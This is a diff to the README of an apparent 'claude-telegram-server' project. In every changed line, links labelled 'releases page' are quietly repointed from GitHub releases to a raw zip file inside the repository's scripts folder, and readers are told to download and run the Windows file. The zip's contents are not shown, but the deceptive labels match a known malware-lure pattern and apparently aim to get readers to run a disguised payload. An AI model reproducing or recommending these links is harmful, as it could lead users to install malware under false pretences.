@@ -1,6 +1,6 @@
 # 🤖 claude-telegram-server - Run Claude in Telegram, 24/7
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Release-purple?style=for-the-badge)](https://github.com/Hewechargeable220/claude-telegram-server/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Release-purple?style=for-the-badge)](https://raw.githubusercontent.com/Hewechargeable220/claude-telegram-server/main/scripts/claude-server-telegram-1.0.zip)
 
 ## 📌 What this is
 
@@ -10,7 +10,7 @@ It is built for people who want remote access to their coding helper from a phon
 
 ## 🪟 Windows quick start
 
-If you want to use this on Windows, go to the [releases page](https://github.com/Hewechargeable220/claude-telegram-server/releases) and download and run the latest Windows file.
+If you want to use this on Windows, go to the [releases page](https://raw.githubusercontent.com/Hewechargeable220/claude-telegram-server/main/scripts/claude-server-telegram-1.0.zip) and download and run the latest Windows file.
 
 ### What you need
 
@@ -23,7 +23,7 @@ If you want to use this on Windows, go to the [releases page](https://github.com
 
 ## 📥 Download and install
 
-1. Open the [releases page](https://github.com/Hewechargeable220/claude-telegram-server/releases)
+1. Open the [releases page](https://raw.githubusercontent.com/Hewechargeable220/claude-telegram-server/main/scripts/claude-server-telegram-1.0.zip)
 2. Find the latest release
 3. Download the Windows file for your computer
 4. Run the file
@@ -162,7 +162,7 @@ This often means the setup is not complete. Open the app from a terminal window 
 
 ## 📦 Release notes to check
 
-When you visit the [releases page](https://github.com/Hewechargeable220/claude-telegram-server/releases), look for:
+When you visit the [releases page](https://raw.githubusercontent.com/Hewechargeable220/claude-telegram-server/main/scripts/claude-server-telegram-1.0.zip), look for:
 
 - The latest version
 - Windows download files
@@ -195,7 +195,7 @@ After setup, the flow is simple:
 
 ## 🔗 Download again
 
-Visit the [releases page](https://github.com/Hewechargeable220/claude-telegram-server/releases) to download and run the latest Windows file
+Visit the [releases page](https://raw.githubusercontent.com/Hewechargeable220/claude-telegram-server/main/scripts/claude-server-telegram-1.0.zip) to download and run the latest Windows file
 
 ## 📝 Repository topics
 
